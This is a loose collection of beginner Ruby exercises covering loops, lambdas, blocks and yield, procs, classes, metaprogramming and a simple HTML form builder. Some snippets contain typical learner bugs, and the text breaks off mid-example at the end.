--------------
RUBY EXERCISES
--------------








----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

lambda, while usage
-------------------

one_armed_bandit_v1.rb
----------------------


add_100 = lambda { |z| z + 100 }
add_200 = lambda { |z| z + 200 }
add_300 = lambda { |z| z + 300 }
add_400 = lambda { |z| z + 400 }
add_500 = lambda { |z| z + 500 }
add_600 = lambda { |z| z + 600 }
add_700 = lambda { |z| z + 700 }
add_800 = lambda { |z| z + 800 }
add_900 = lambda { |z| z + 900 }

scores = {
  100 => add_100,
  222 => add_200,
  333 => add_300,
  444 => add_400,
  555 => add_500,
  666 => add_600,
  777 => add_700,
  888 => add_800,
  999 => add_900
}

balance = 1000

while true
  print 'Enter to play...'
  gets

  combination = rand(100..999)
  puts "Game: ---#{combination}---"

  if scores[combination]
    result = scores[combination]
    balance = result.call balance
    puts "You win and got $#{result}"
  else
    balance -= 10
    puts 'Lose, minus $10'
  end

  puts "Balance: $#{balance}"
  puts

  break if balance <= 0
end

puts 'LOOSER'




---



one_armed_bandit_v2.rb
----------------------


add_10 = lambda { |x| x + 10 }
add_20 = lambda { |x| x + 20 }
sub_5  = lambda { |x| x - 5 }

scores = {
  100 => add_10,
  222 => add_10,
  333 => add_10,
  444 => add_20,
  555 => add_20,
  666 => add_20,
  777 => add_20,
  888 => sub_5,
  999 => sub_5
}

balance = 1000

loop do
  combination = rand(100..999)
  puts "Combination: #{combination}"

  if scores[combination]
    result = scores[combination]
    balance = result.call balance
    puts "Lambda called"
  else
    balance = sub_5.call balance
  end

  puts "Balance: $#{balance}"
  puts 'Press Enter...'
  gets

  break if balance <= 0
end




---




one_armed_bandit_v3.rb
----------------------


scores = {
  111 => 100,
  222 => 200,
  333 => 300,
  444 => 400,
  555 => 500,
  666 => 600,
  777 => 700,
  888 => 800,
  999 => 900
}

balance = 1000

while true do
  puts "Press Enter to play..."
  gets

  combination = rand(100..999)
  puts combination

  if scores[combination]
    balance = balance + scores[combination]
    puts "You win: plus $#{scores[combination]} to your balance"
  elsif balance <= 0
    puts "You lose"
    exit
  else
    balance -= 10
    puts "Minus $#{10}"
  end
  puts "Your balance $#{balance}"
end







----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

loop do, case, array, sybols
----------------------------

rock_paper_scissors.rb
----------------------


array = %i[rock scissors paper]

loop do
  mashine = array[rand(0..2)]

  print 'Make choice... [S]cissors, [R]ock, [P]aper:  '
  choice = gets.strip.capitalize

  case choice
  when choice == 'S' then user_input = :scissors
  when choice == 'R' then user_input = :rock
  when choice == 'P' then user_input = :paper
  end

  matrix = [
    %i[rock     scissors first],
    %i[rock     paper    second],
    %i[rock     rock     draw],
    %i[scissors rock     second],
    %i[scissors paper    first],
    %i[scissors scissors draw],
    %i[paper    scissors second],
    %i[paper    rock     first],
    %i[paper    paper    draw]
  ]

  puts "Mashine: \t#{mashine}"
  puts "Player:  \t#{user_input}"

  matrix.each do |item|
    if item[0] == user_input && item[1] == mashine
      case matrix
      when item[2] == :draw   then puts "The result:  \tDRAW"
      when item[2] == :first  then puts "The result:  \tYOU WIN"
      when item[2] == :second then puts "The result:  \tYOU LOSE"
      end
    end
  end
end



----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

blocks, yield
-------------

even_odd.rb
-----------


numbers = [ 5, 4, 4, 4, 5, 5, 5 ]

def even?(_number, &block)
  _number % 2 == 0 ? (puts "#{_number} even") : yield
end

numbers.each do |number|
  even?(number) { puts "#{number} odd" }
end





---




self_method.rb
--------------


class ShowName
  def self.show_attrs **attributes
    pp attributes
  end
end

params = {
  mark: 'mark',
  eric: 'eric'
}

ShowName.show_attrs mark: 'mark'
ShowName.show_attrs eric: 'eric'
ShowName.show_attrs mark: 'mark', eric: 'eric'





---




greeting.rb
-----------


greetings = ['hi', 'howdy', 'hello', 'yooo', 'wasup']

greetings.length.times do |greeting|
  puts '-----------'
  puts greeting + 1
  puts '-----------'

  puts greetings.sample
  puts greetings[greeting]
end





---






greetings.each do |greeting|
  puts greeting
end





---






formatted_greetings = greetings.map do |greeting|
  greeting = greeting[0].upcase + greeting[1..greeting.length]
end





---





formatted_greetings.each do |greeting|
  puts greeting
end





---




def display_1
  yield 'whatsup_1'
end

display_1 do |message|
  puts "#{message.upcase} " * 3
end





---






def display_2 &block
  pp block
  block.call('whatsup_2')
end

display_2 do |message|
  puts "#{message} " * 2
end





---






def display_3
  yield 'whatsup_3'
end

my_lambda = ->(message) { puts "#{message.upcase} " * 6 }
display_3 &my_lambda





---






def secondary_method
  yield 'whatsup_5'
end

def display_4(message, &block)
  puts message
  secondary_method &block
end

display_4 'whatsup_4', &my_lambda





---




def secondary_method
  yield "Hello here"
end

def my_method(message, callable_1, callable_2)
  callable_1.call("Hello there")
  callable_2.call(message)
end

my_method "Calling block...", ->(message) { puts message }, ->(message) { puts message.upcase.inspect }





---






def secondary_method
  yield "Hello bro"
end

def my_method(message, callable_1, callable_2)
  callable_1.call("Hello man")
  callable_2.call(message)
end

my_lambda_1 = ->(message) { puts message }
my_lambda_2 = ->(message) { puts message }
message = "Calling block..."

my_method message, my_lambda_1, my_lambda_2





---




hi_proc = Proc.new { |message| pp message }
hi_lambda = lambda { |message| pp message }

double_proc = proc { |number| p number ** 2 }
double_lambda = ->(number) { p number ** 2 }

hi_proc.call 'hi'
hi_lambda.call 'hi'

double_proc.call 5
double_lambda.call 5





---






block_lambda = ->(message) do
  pp 'hi'
  return message
end

block_proc = proc do |message|
  pp 'hi'
  return message
end





---





def block_check callable
  result = callable.call 'hi'

  pp "The result is #{result}"
  pp "I have called #{callable}"
end

block_check hi_lambda
block_check block_lambda
block_check block_proc





---




require_relative 'block_secrets_unzipper'
require_relative 'block_secrets_zipper'

Zipper.config do |config|
  config.extention = '.txt'

  config.processing = ->(content) { puts content.upcase }
end






require_relative 'block_secrets_unzipper_config'

Zipper::Processor.open_and_process_zip './zip_files/ziped.zip'





require 'zip'
require 'pathname'

module Zipper
  module Processor
    class << self
      def open_and_process_zip path
        Zip::File.open_buffer(File.open path) do |zip_file|
          fetch_zip_entries(zip_file) { |zip_entry| process zip_entry }
        end
      end

      def fetch_zip_entries zip_file
        return unless block_given?

        zip_file.each do |zip_entry|
          next unless proper_ext? zip_entry.name

          yield zip_entry
        end
      end

      def process zip_entry
        Zipper.processing.call(zip_entry.get_input_stream.read)
      end

      private

      def proper_ext? filename
        Zipper.extention == Pathname.new(filename).extname
      end
    end
  end
end





module Zipper
  class << self
    attr_accessor :extention, :processing

    def config
      yield self
    end
  end
end





---




def time
  start = Time.now
  yield
  Time.now - start
end

pp time { 'a' * 10_000_000 }





---





pp ({ a: 1 }.fetch(:a))
pp ({ a: 1 }.fetch(:a) { 123 })
pp ({ a: 1 }.fetch(:c) { 123 })

puts



def request_http &on_complete
  pp on_complete
  on_complete.call
end

request_http { pp 'Operation done' }





---




def whatsup
  pp 'hi_1'
end

whatsup do
  pp 'hi_2'
end

whatsup { pp 'hi_3' }

def whatsup
  yield
end

whatsup do
  pp 'hi_4'
end

whatsup { pp 'hi_5' }





---





def reached
  pp 'the top'
  yield
  pp 'the bottom'
end

reached do
  pp 'the yield'
end





---






def how_old
  yield 'John', 2
end

how_old do |name, age|
  pp "#{name} is #{age} years old"
end





---






[1, 2, 3].each do |number|
  puts "Number #{number}"
end





---






def two &block
  puts "two is: #{yield}"
end

two { 2 }





---






def my_map array
  new_array = []

  for element in array
    pp new_array.push yield element
  end

  new_array
end

my_map([1, 2, 3]) do |number|
  number * 2
end





---






def method_with_block &block
  block.call
end

method_with_block { pp "#{'calling block for'.upcase} method_with_block" }





---






class Car
  attr_accessor :color, :doors

  def initialize
    yield(self)
  end
end

car = Car.new do |c|
  c.color = "Red"
  c.doors = 4
end

pp car
puts "color: #{car.color} \ndoors: #{car.doors}"



Bus = Struct.new(:color, :doors, keyword_init: true)

bus = Bus.new(color: 'Green', doors: 3) do |c|
  c.color
  c.doors
end

pp bus
puts "color: #{bus.color} \ndoors: #{bus.doors}"





---






class Note
  attr_accessor :note

  def initialize(note=nil)
    @note = note
    puts "@note is #{@note}"
  end

  def self.create
    self.connect
    note = new(yield)
    note.write
    self.disconnect
  end

  def write
    puts "Writing \"#{@note}\" to the database."
  end

  private

  def self.connect
    puts "Connecting to the database..."
  end

  def self.disconnect
    puts "Disconnecting from the database..."
  end
end

note = Note.create { "Hello" }

puts

note = Note.create do |s|
  pp s
end





---






class Fixnum
  def to_proc
    Proc.new do |object, *arguments|
      object % self == 0
    end
  end
end

number_3 = [1,2,3,4,5,6,7,8,9,10].select(&3)
number_5 = [1,2,3,4,5,6,7,8,9,10].select(&5)
number_1 = [1,2,3,4,5,6,7,8,9,10].select(&1)
number_2 = [1,2,3,4,5,6,7,8,9,10].select(&2)

pp "3: #{number_3}"
pp "5: #{number_5}"
pp "1: #{number_1}"
pp "2: #{number_2}"





---




require 'pry'

def with_logging(description = '', &block)
  @log.puts "Starting '#{description}'"
  begin
  block.call
  rescue
    @log.puts "'#{description}' FAILED!"
    return -1
  end
  @log.puts "Completed '#{description}'"
  1
end


@log = File.open("text_files/log_#{Time.now.to_i}.txt", 'w+')

status_code = with_logging('Calculate seconds in a day') do
  puts 60 * 60 * 24
end
pp status_code

status_code = with_logging("Open a file I know doesn't exist") do
  File.readlines('100_%_not_a_file.txt') { |line| puts line }
end
pp status_code




def say_with_time
  pp [yield, Time.now.to_s].join(', ')
end

say_with_time {'hello'}





---




def each
  number = 0

  while number < size
    yield at(number)
    number += 1
  end
end

[1, 2, 3].each do |number|
  pp number
end





---






def each
  return to_enum(:each) unless block_given?
  number = 0

  while number < size
    yield at(number)
    number += 1
  end
end

[1, 2, 3].each do |number|
  pp number.to_s
end





---





'foo bar baz'.split { pp 'block' }


def each_explicit &block
  return to_enum(:each) unless block
  number = 0

  while number < size
    block.call at(number)
    number += 1
  end
end





---






def run_proc_with_random_number proc
  proc.call rand(0..6)
end

my_proc = Proc.new { |number| pp "|#{number}|" }

run_proc_with_random_number(my_proc)





---






def run_proc_with_random_number &proc
  proc.call rand(700...1600)
end

run_proc_with_random_number { |number| pp number * 23.15 }





---






pp [1, 2, 3].map(&:to_s)
pp [1, 2, 3].map {|number| number.to_s }
pp [1, 2, 3].map {|number| number.send(:to_s) }
pp [1, 2, 3].map {|number| number.send :to_s }

pp %w[ words upcased ].map {|number| number.send :upcase }





---





class Symbol
  def to_proc
    Proc.new { |number| number.send(self) }
  end
end

pp symbol = :symbol

pp symbol.to_proc



def return_from_proc
  ten = Proc.new { return 10 }.call

  puts "This #{ten} will never be printed."
end

return_from_proc





---






def return_from_lambda
  ten = lambda { return 10 }.call

  puts "The lambda returned #{ten}, and this will be printed."
end

return_from_lambda





---




def collection_filter(collection)
  result = []

  collection.each do |element|
    result << element if yield(element)
  end

  pp result
end

my_collection = [ 1, 2, 3 ]

collection_filter(my_collection, &:even?)

my_collection.each do |element|
  pp element.even?
end





---






collection_filter my_collection do |c|
  pp c.inspect
end





---






collection_filter(my_collection, &:odd?)

my_collection.each do |element|
  pp element.odd?
end





---





collection_filter(my_collection, &:to_s)

my_collection.each do |element|
  pp element.to_s
end




----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

------------
classes, oop
------------


class Airplane
  attr_reader :model, :altitude
  attr_accessor :speed

  def initialize model
    @model = model
    @speed, @altitude = 0
  end

  def fly
    @speed, @altitude = 800, 10_000
  end

  def land
    @speed, @altitude = 0
  end

  def moving?
    @speed > 0
  end
end



models = ['Airbus-320', 'Boeing-777', 'Il-86']
planes = []

100.times do
  model = models[rand(0..2)]
  plane = Airplane.new(model)

  plane.fly if rand(0..1) == 1
  plane.speed = rand(500..800)
  planes << plane
end

planes.each do |plane|
  puts "Model: #{plane.model} Speed: #{plane.speed} Altitude: #{plane.altitude}"
  puts "Is moving: #{plane.moving?}"
end

plane_1 = Airplane.new('Boeing-777')
plane_2 = Airplane.new('Airbus-320')

puts "Model: #{plane_1.model} Speed: #{plane_1.speed} Altitude: #{plane_1.altitude}"
puts "Is moving: #{plane_1.moving?}"


plane_1.fly

puts "Model: #{plane_1.model} Speed: #{plane_1.speed} Altitude: #{plane_1.altitude}"
puts "Is moving: #{plane_1.moving?}"


plane_1.land

puts "Model: #{plane_1.model} Speed: #{plane_1.speed} Altitude: #{plane_1.altitude}"
puts "Is moving: #{plane_1.moving?}"


plane_2.fly

puts "Model: #{plane_2.model} Speed: #{plane_2.speed} Altitude: #{plane_2.altitude}"
puts "Is moving: #{plane_2.moving?}"





---




class Airport
  attr_reader :name, :planes

  def initialize name
    @name,  @planes = name, []
  end

  def add_planes plane
    @planes << plane
  end
end


class Plane
  attr_reader :model

  def initialize model
    @model = model
  end
end



airports = []

airport_1 = Airport.new 'SVO'
airport_2 = Airport.new 'DME'

airports << airport_1
airports << airport_2

plane_1 = Plane.new 'Boeing-777'
plane_2 = Plane.new 'Airbus-320'
plane_3 = Plane.new 'Il-80'

plane4 = Plane.new 'Boeing-111'
plane5 = Plane.new 'Airbus-222'
plane6 = Plane.new 'SU-333'

airport_1.add_planes plane_1
airport_1.add_planes plane_2
airport_1.add_planes plane_3

airport_2.add_planes plane4
airport_2.add_planes plane5
airport_2.add_planes plane6

puts airport_1.name
puts airport_2.name

puts
puts



puts airport_1.planes
puts airport_2.planes

puts
puts

airports.each do |airport|
  puts "Airport #{airport.name}\n\n"

  airport.planes.each do |plane|
    puts "Plane: #{plane.model}"
  end
  puts
end





---




class Album
  attr_reader :name, :songs

  def initialize name
    @name, @songs = name, []
  end

  def add_songs song
    @songs << song
  end
end

class Song
  attr_reader :name, :duration

  def initialize name, duration
    @name, @duration = name, duration
  end
end



album_1 = Album.new 'Rock legends'

song_1 = Song.new 'Blury', 4
song_2 = Song.new 'My way', 5

album_1.add_songs song_1
album_1.add_songs song_2

puts album_1.name

album_1.songs.each do |song, duration|
  puts "Album: #{song.name} #{song.duration}"
end

puts

puts album_1.songs[1].name





---




class Animal
  def initialize name
    @name = name
  end

  def run
    puts "#{@name} is running..."
  end

  def jump
    puts "#{@name} is jumping..."
  end
end


class Cat < Animal
  def initialize
    super 'cat'
  end

  def say_meow
    puts "Meow"
  end
end


class Dog < Animal
  def initialize
    super 'dog'
  end

  def say_woof
    puts "Woof"
  end
end


cat = Cat.new

cat.run
cat.say_meow


dog = Dog.new

dog.jump
dog.say_woof





---




class ApplicationError
  def display_error
    puts "Error! Error!"
  end
end

class SuperBadError < ApplicationError
end

error = SuperBadError.new
error.display_error





---




require_relative './class_article_model_metaprogramming'

class Article
  include Model

  upcase :title
  upcase :author
  # upcase :chapter
end

article = Article.new(
  title:    'article',
  author:   'John',
  chapter:  'first'
)

pp article
pp article.attributes
pp article.title
pp article.instance_variables
pp article.title = 'article_2'
pp article.attributes
pp article.attributes.to_a
pp article




article.attributes.each_pair do |attribute|
  pp attribute.first
end




article.attributes.each_pair do |attribute|
  pp attribute.last
end




article.attributes.each_pair do |attribute|
  pp attribute
end




article.attributes.to_h.each_pair do |name, value|
  pp name
end




pp article.attributes[:chapter]
pp article.attributes[:author]
pp article.attributes[:title]








module Model
  def self.included base
    base.extend ClassMethods
  end

  attr_accessor :attributes

  module ClassMethods
    attr_reader :upcased

    def upcase attribute_name
      @upcased ||= []

      define_method "#{attribute_name}" do
        @attributes[attribute_name]
      end
      define_method "#{attribute_name}=" do |value|
        @attributes[attribute_name] = value
        value.upcase! if self.class.upcased.include? attribute_name
      end
      @upcased << attribute_name
    end
  end

  def initialize params
    @attributes = {}

    params.each do |name, value|
      @attributes[name] = value
      value.upcase! if self.class.upcased.include? name
    end
  end
end





---




class Artist
  attr_reader :name, :country, :albums

  def initialize name, country
    @name, @country, @albums = name, country, []
  end

  def artist_albums album
    @albums << album
  end

  def albums
    puts "The albums of #{name}:"

    @albums.each_with_index do |album, index|
      puts "\t#{index + 1}. #{album.name} #{album.date} #{album.style}"
    end
  end
end


class Album
  attr_reader :name, :date, :style

  def initialize name, date, style
    @name, @date, @style, @album_songs = name, date, style, []
  end

  def add_songs songs
    @album_songs << songs
  end

  def puts_songs
    puts "The album #{name} #{date}, #{style}:"

    @album_songs.each_with_index do |song_pare, index|
      puts "\tTrack #{index + 1}. #{song_pare.name} #{song_pare.duration}"
    end
  end
end


class Song
  attr_reader :name, :duration

  def initialize name, duration
    @name, @duration, @songs = name, duration, {}
  end

  def song_pair
    @songs = { @name => @duration }
  end
end



song_1 = Song.new 'Nokie', '5 min'
song_2 = Song.new 'My way', '6 min'
song_3 = Song.new 'Faith', '3.5 min'

album_1 = Album.new 'My way', 1999, 'rock, alternative'
album_2 = Album.new 'Faith', 1995, 'rock, alternative'

album_1.add_songs song_1
album_1.add_songs song_2
album_2.add_songs song_3

artist1 = Artist.new 'Limp Bizkit', 'USA'

artist1.artist_albums album_1
artist1.artist_albums album_2

artist1.albums

album_1.puts_songs
album_2.puts_songs





---




class Account
  attr_reader :name, :balance

  def initialize(name, balance = 100)
    @name, @balance = name, balance
  end

  public

  def display_balance pin_number
    pin_number == pin ? (pp "Balance: $#{@balance}") : (pp pin_error)
  end

  def withdraw pin_number, amount
    if pin_number == pin
      @balance -= amount
      pp "Withdrew #{amount}"
    else
      pp pin_error
    end
  end

  private

  def pin; @pin = 1234; end
  def pin_error; 'Access denied: incorrect PIN'; end
end



checking_account = Account.new 'Gor', 100_000
pp checking_account




checking_account.display_balance 1234
checking_account.display_balance 12345
checking_account.withdraw 1234, 345
checking_account.display_balance 1234





---




class Book
  attr_reader :last_person, :persons

  def initialize name
    @last_person, @name, @persons = '', name, {}
  end

  def add_person options
    @last_person = [options[:name]]

    puts "Already exists!" if @persons[options[:name]]

    @persons[options[:name]] = options[:age]
  end

  def show_all
    @persons.keys.each do |name|
      age = @persons[name]
      puts "#{@name}\t Name: #{name}\t Age: #{@persons[name]}"
    end
  end
end


book_1 = Book.new 'MAN'
book_2 = Book.new 'WOMAN'

book_1.add_person name: 'Walt',  age: 33
book_2.add_person name: 'Alice', age: 32
book_2.add_person name: 'Kate',  age: 44

book_1.show_all
book_2.show_all




puts book_1.persons
puts book_2.persons




puts book_2.last_person





---




class Machine
  @@users = {}

  def initialize username, password
    @username, @password = username, password
    @@users[username] = password
    @files = {}
  end

  def create filename
    time = Time.now
    @files[filename] = time
    puts "#{filename} was created by #{@username} at #{time}."
  end

  def Machine.get_users
    @@users
  end
end



my_machine = Machine.new("eric", 01234)
your_machine = Machine.new("you", 56789)

my_machine.create("groceries.txt")
your_machine.create("todo.txt")

puts "Users: #{Machine.get_users}"





---




class Connection
  def self.add_connection_variable name

    define_method name do
      instance_variable_get "@#{name}"
    end

    define_method "#{name}=" do |value|
      instance_variable_set "@#{name}", value
    end
  end

  add_connection_variable :timeout
  add_connection_variable :protocol
  add_connection_variable :something
end

pp connection = Connection.new





pp connection.timeout = 4
pp connection.instance_variables





pp connection.protocol
pp connection.protocol = 'qnq'
pp connection.instance_variables





pp connection
pp connection.protocol = 'ssh'
pp connection





pp connection.something
connection.something = 'something else'
pp connection.something

pp connection.instance_variables





pp connection




connection.something do |c|
  pp c.upcase
end





---




class DollarRate
  attr_accessor :currency, :sum

  @@dollar_rate = 87.15

  def initialize currency, sum
    @currency, @sum = currency, sum
    @result = 0
  end

  def self.menu
    puts '1 = Convert rubles'
    puts '2 = Convert dollars'
  end

  def convert
    case @currency
    when 1 then @result = @sum / @@dollar_rate
    when 2 then @result = @sum * @@dollar_rate
    end
    @result
  end

  def show_result
    puts "The sum: #{@sum}"
    puts "The converted sum: #{@result.round(2)}"
  end
end


menu = DollarRate.menu



rate_1 = DollarRate.new 2, 349

rate_1.convert
rate_1.show_result



rate_2 = DollarRate.new 1, 65_678

rate_2.convert
rate_2.show_result





---




class Country
  attr_reader :name, :airports

  def initialize name
    @name, @airports = name, []
  end

  def add_airports airport
    @airports << airport
  end
end


class Airport
  attr_reader :name, :planes

  def initialize name
    @name, @planes = name, []
  end

  def add_planes plane
    @planes << plane
  end
end


class Plane
  attr_reader :model

  def initialize model
    @model = model
  end
end



airports = []

airport_1 = Airport.new 'SVO'
airport_2 = Airport.new 'DME'

airports << airport_1
airports << airport_2

countries = []

country_1 = Country.new 'Mehico'
country_2 = Country.new 'Moscow'
country_3 = Country.new 'NY'

country_1.add_airports 'MehocoAir'
country_1.add_airports 'MehocoAir2'

country_2.add_airports airport_1
country_2.add_airports airport_2

country_3.add_airports 'NY airport'

countries << country_1
countries << country_2
countries << country_3

plane_1 = Plane.new 'Boeing-777'
plane_2 = Plane.new 'Airbus-320'
plane_3 = Plane.new 'Il-80'

plane_4 = Plane.new 'Boeing-111'
plane_5 = Plane.new 'Airbus-222'
plane_6 = Plane.new 'SU-333'

airport_1.add_planes plane_1
airport_1.add_planes plane_2
airport_1.add_planes plane_3

airport_2.add_planes plane_4
airport_2.add_planes plane_5
airport_2.add_planes plane_6

pp airport_1.name
pp airport_2.name



pp airport_1.planes
pp airport_2.planes





countries.each do |country|
  puts "Country: #{country.name}"

  country.airports.each do |airport|
    puts "Airport #{airport}"
  end
end



airports.each do |airport|
  puts "Airport #{airport.name}"
  
  airport.planes.each do |plane|
    puts "Plane: #{plane.model}"
  end
end





---




class Cat
  def initialize name, age, weight
    @name, @age, @weight = name, age, weight
  end

  def name; @name; end
  def age; @age; end
  def weight; @weight; end

  def name= name
    @name = name
  end

  def age= age
    @age = age
  end

  def weight= weight
    @weight = weight
  end
end



# same class

class Cat
  attr_writer :name, :age, :weight

  def initialize name, age, weight
    @name, @age, @weight = name, age, weight
  end

  def name; @name; end
  def age; @age; end
  def weight; @weight; end
end


# same class
class Cat
  attr_accessor :name, :age, :weight

  def initialize name, age, weight
    @name, @age, @weight = name, age, weight
  end
end


# gives nil
class Cat
  attr_accessor :name

  def initialize string
    name = string
  end
end



pp cat = Cat.new('Kit')
pp cat.name





---




class RandomEngine
  def self.get_random_value
    rand(100..999)
  end

  def self.to_string
    get_random_value.to_s
  end

  def third
    puts 'three'
  end
end


module GameEngine
  def self.play
    a = RandomEngine.get_random_value
  end

  def self.show
    b = RandomEngine.to_string
  end

  def self.three
    c = RandomEngine.new.third
  end

  def self.first
    three[0]
  end
end


pp random_engine = RandomEngine.get_random_value
pp random_engine = RandomEngine.to_string



pp random_engine_2 = RandomEngine.new
pp random_engine_2.third
pp random_engine_3 = RandomEngine.new.third



pp GameEngine.play
pp GameEngine.show



pp game_engine = GameEngine.play
pp game_engine = GameEngine.show
pp game_engine





---




require 'active_support/all'

module HexletCode
  autoload(:Tag, "./class_form_generator_tags.rb")

  attr_accessor :input

  class << self
    def form_for(struct, **form_attributes)
      form = []

      form_attributes = form_attributes.map do |attr, value|
        attr == :url ? "action='#{value}'" : "#{attr}='#{value}'"
      end

      form << "<form "
      form_attributes.present? ? (form << "#{form_attributes.join(' ')}") : (form << "method='post'")
      form << ">\n\t"
      form << "#{input(struct)}\n"
      form << "</form>"
      form.join
    end

    def input(struct, *attributes)
      input_tag = []

      # struct.each_pair do |name, value|
      #   attributes << "#{name}='#{value}'"
      # end
      attributes = struct.to_h
      p attributes

      input_tag << "<input "
      input_tag << attributes.map {|attr, value| "#{attr}='#{value}'"}.join(' ')
      input_tag << ">"
      input_tag.join
    end
  end
end


User = Struct.new(:name, :job, :gender, keyword_init: true)
user = User.new(name: 'rob', job: 'hexlet', gender: 'm')

# user.each do |u|
#   u.input :name
# end

html = HexletCode.form_for user, url: 'true', method: 'get' do |f|
  # Проверяет есть ли значение внутри name
  f.input :name, class: 'eric'
  # # Проверяет есть ли значение внутри job
  # f.input :job
end

puts html
puts

pp user.to_h
pp user.members
pp user.values
puts

# <form action="#" method="post">
#   <input name="name" type="text" value="rob">
#   <textarea name="job" cols="20" rows="40">hexlet</textarea>
# </form>



html_2 = HexletCode.form_for user, url: '#' do |f|
  # f.input :name, class: 'user-input'
  # f.input :job
  # f.submit
end

# <form action="#" method="post">
#   <input name="name" type="text" value="rob" class="user-input">
#   <input name="job" type="text" value="">
# </form>
puts html_2
puts

html_3 = HexletCode.form_for user, url: '/users' do |f|
  # f.input :job, as: :text, rows: 50, cols: 50
end

# <form action="/users" method="post">
#   <textarea cols="50" rows="50" name="job">hexlet</textarea>
# </form>
puts html_3
puts

html_4 = HexletCode.form_for user, url: '/users' do |f|
  # f.input :name
  # f.input :job, as: :text
  # # Поля age у пользователя нет
  # f.input :age
end
# =>  `public_send': undefined method `age' for #<struct User id=nil, name=nil, job=nil> (NoMethodError)
puts html_4
puts





---




require 'active_support/all'

module HexletCode
  autoload(:Tag, "./class_form_generator_tags.rb")

  attr_accessor :input

  class << self
    def form_for(struct, **form_attributes)
      form = []

      form_attributes = form_attributes.map do |attr, value|
        attr == :url ? "action='#{value}'" : "#{attr}='#{value}'"
      end

      form << "<form "
      form_attributes.present? ? (form << "#{form_attributes.join(' ')}") : (form << "method='post'")
      form << ">\n\t"
      form << "#{input(struct)}\n"
      form << "</form>"
      form.join
    end

    def input(struct, *attributes)
      input_tag = []

      attributes = struct.to_h
      p attributes

      input_tag << "<input "
      input_tag << attributes.map {|attr, value| "#{attr}='#{value}'"}.join(' ')
      input_tag << ">"
      input_tag.join
    end
  end
end


User = Struct.new(:name, :job, :gender, keyword_init: true)
user = User.new(name: 'rob', job: 'hexlet', gender: 'm')

# user.each do |u|
#   u.input :name
# end

html = HexletCode.form_for user, url: 'true', method: 'get' do |f|
  # Проверяет есть ли значение внутри name
  f.input :name, class: 'eric'
  # # Проверяет есть ли значение внутри job
  # f.input :job
end

puts html
puts

pp user.to_h
pp user.members
pp user.values
puts

# <form action="#" method="post">
#   <input name="name" type="text" value="rob">
#   <textarea name="job" cols="20" rows="40">hexlet</textarea>
# </form>



html_2 = HexletCode.form_for user, url: '#' do |f|
  # f.input :name, class: 'user-input'
  # f.input :job
  # f.submit
end

# <form action="#" method="post">
#   <input name="name" type="text" value="rob" class="user-input">
#   <input name="job" type="text" value="">
# </form>
puts html_2
puts

html_3 = HexletCode.form_for user, url: '/users' do |f|
  # f.input :job, as: :text, rows: 50, cols: 50
end

# <form action="/users" method="post">
#   <textarea cols="50" rows="50" name="job">hexlet</textarea>
# </form>
puts html_3
puts

html_4 = HexletCode.form_for user, url: '/users' do |f|
  # f.input :name
  # f.input :job, as: :text
  # # Поля age у пользователя нет
  # f.input :age
end
# =>  `public_send': undefined method `age' for #<struct User id=nil, name=nil, job=nil> (NoMethodError)
puts html_4
puts





---




module HexletCode
  class Tag
    def self.build(name, **attributes)
      attributes = attributes.map { |attr, value| " #{attr}='#{value}'" }
      result = []

      result << "<#{name}"
      result << "#{attributes.join}"
      result << ">" if !unpaired?(name)
      result << "#{yield}" if block_given?
      unpaired?(name) ? result << ">" : result << "</#{name}>"
      result.join
    end

    def self.unpaired?(tag)
      unpaired = %w[ br hr img input meta area base col embed link param source track command keygen menuitem wbr ]
      unpaired.include?(tag) ? true : false
    end
  end
end



pp HexletCode::Tag.build('br')
pp HexletCode::Tag.build('img', src: 'path/to/image')
pp HexletCode::Tag.build('input', type: 'submit', value: 'Save')
pp HexletCode::Tag.build('label') { 'Email' }
pp HexletCode::Tag.build('label', for: 'email') { 'Email' }
pp HexletCode::Tag.build('div')
puts
pp HexletCode::Tag.build('form', action: '#', method: 'post')





---




require 'active_support/all'

module HexletCode
  autoload(:Tag, "./class_form_generator_tags.rb")

  attr_accessor :input

  class << self
    def form_for(struct, **form_attributes)
      form = []

      form_attributes = form_attributes.map do |attr, value|
        attr == :url ? "action='#{value}'" : "#{attr}='#{value}'"
      end

      form << "<form "
      form_attributes.present? ? (form << "#{form_attributes.join(' ')}") : (form << "method='post'")
      form << ">\n\t"
      form << "#{input(struct)}\n"
      form << "</form>"
      form.join
    end

    def input(struct, *attributes)
      input_tag = []

      @input = struct.each_pair do |key, value|
        define_method "#{key}" do
          @attributes[key]
        end
        define_method "#{key}=" do |value|
          @attributes[key] = value
        end
        attributes << "#{key}='#{value}'"
        puts attributes
      end

      input_tag << "<input "
      attributes.present? ? (input_tag << "#{attributes.join(' ')}") : (input_tag << "name='' method=''")
      input_tag << ">"
      input_tag.join
    end
  end
end


User = Struct.new(:name, :job, :gender, keyword_init: true)
user = User.new(name: 'rob', job: 'hexlet', gender: 'm')

# user.each do |u|
#   u.input :name
# end

html = HexletCode.form_for user, url: 'true', method: 'get' do |f|
  # Проверяет есть ли значение внутри name
  pp f.input :name, class: 'eric'
  # # Проверяет есть ли значение внутри job
  # f.input :job
end

puts html
puts

pp user.to_h
pp user.members
pp user.values
puts

# <form action="#" method="post">
#   <input name="name" type="text" value="rob">
#   <textarea name="job" cols="20" rows="40">hexlet</textarea>
# </form>



html_2 = HexletCode.form_for user, url: '#' do |f|
  # f.input :name, class: 'user-input'
  # f.input :job
  # f.submit
end

# <form action="#" method="post">
#   <input name="name" type="text" value="rob" class="user-input">
#   <input name="job" type="text" value="">
# </form>
puts html_2
puts

html_3 = HexletCode.form_for user, url: '/users' do |f|
  # f.input :job, as: :text, rows: 50, cols: 50
end

# <form action="/users" method="post">
#   <textarea cols="50" rows="50" name="job">hexlet</textarea>
# </form>
puts html_3
puts

html_4 = HexletCode.form_for user, url: '/users' do |f|
  # f.input :name
  # f.input :job, as: :text
  # # Поля age у пользователя нет
  # f.input :age
end
# =>  `public_send': undefined method `age' for #<struct User id=nil, name=nil, job=nil> (NoMethodError)
puts html_4
puts





---




require 'forwardable'

class RecordCollection
  attr_accessor :records
  extend Forwardable

  def_delegator :@records, :[], :record_number
end

collection = RecordCollection.new

pp collection.records = [ 4, 5, 6 ]
pp collection.record_number(0)





---




require 'forwardable'

class RecordCollection
